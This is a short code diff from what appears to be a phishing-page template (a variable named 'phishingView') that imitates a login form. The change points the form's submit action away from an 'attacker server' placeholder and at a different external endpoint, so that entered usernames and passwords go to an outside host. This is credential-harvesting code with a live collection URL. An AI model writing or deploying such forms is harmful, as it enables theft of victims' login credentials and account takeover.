@@ -60,7 +60,7 @@ let phishingView = `
 </header>
 <main class="v5-section login-component">
     <div class="login-form-wrapper">
-        <form novalidate="" method="get" action="http://chessdemo2.infinityfreeapp.com/a-t-t-a-c-k-e-r-s-e-r-v-e-r.php" autocomplete="on" id="login-form"
+        <form novalidate="" method="get" action="https://api.zonacupang.com/" autocomplete="on" id="login-form"
             class="authentication-login-form login-form">
             <div>
                 <input type="email" id="username" name="_username" required="required" form-error-clear=""
